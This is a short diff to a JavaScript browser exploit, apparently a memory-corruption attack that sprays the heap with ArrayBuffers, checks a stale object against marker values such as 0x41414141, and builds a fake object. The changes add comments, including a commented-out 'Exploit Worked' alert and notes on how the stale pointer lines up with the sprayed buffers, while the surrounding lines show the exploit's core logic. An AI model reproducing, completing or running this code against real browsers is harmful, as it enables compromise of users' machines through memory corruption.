@@ -116,6 +116,8 @@ function go_() {
 	dgc();
 	var arr = new Array(0x100);
 	
+	//arr[0] = 0x1;
+	
 	var yolo = new ArrayBuffer(0x1000);
 	arr[0] = yolo;
 	arr[1] = 0x13371337;
@@ -148,6 +150,7 @@ function go_() {
 	var stale = target.stale;
 
 	if((before_len != stale.length) && (stale[0] == 0x41414141)){
+		//alert("Exploit Worked");
 		keep(arr);
 	} else {
 		document.location.reload();
@@ -167,7 +170,8 @@ function go_() {
 
 	for(i = 0; i < bufs.length; i++) {
 		for(k = 0; k < bufs[0].length; k++) {
-
+			// Check if this is what the stale object points to (0x4141414 + 0x101 == 0x41414242)
+			// If this is true then stale[0] points to the same thing as bufs[i][k]
 			if(bufs[i][k] == 0x41414242) {
 				var fakeobj = {};
 				stale[0] = fakeobj;
